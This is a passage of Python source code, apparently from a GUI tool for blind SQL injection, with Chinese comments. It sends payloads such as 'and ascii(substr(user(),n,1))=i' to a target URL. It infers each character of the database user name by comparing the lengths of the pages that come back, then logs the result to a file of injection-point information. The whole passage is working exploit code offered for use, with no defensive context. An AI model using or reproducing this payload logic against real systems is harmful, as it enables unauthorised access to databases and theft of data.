                        poc = " and%20ascii(substr(user()," + str(subnum) + ",1))=" + str(i)
                        new_data = requests.get(url + poc, verify=False).text
                        # 如果原始数据长度和新数据的长度相等即认定为存在，将该字符追加到tmpname临时变量中，num + 1为获取下一个字符做准备并终止循环
                        if (len(old_data) - len(new_data)) < 20 and self.is_exit == "false":
                            username += chr(i)
                            # print(chr(i), end='')
                            # self.usertext.setText(username)
                            subnum += 1
                            break
                self.usertext.setText(username)
            else:
                break
        # print()
        # 将数据库名写入文件
        f = open("注入点信息.txt", 'a')
        f.write("用户：" + username + "\n")
        f.close()
        # print("检测完成！耗时：{:.2f}分".format((time.time() - starttime) / 60))
        is_exit = "false"
        return username
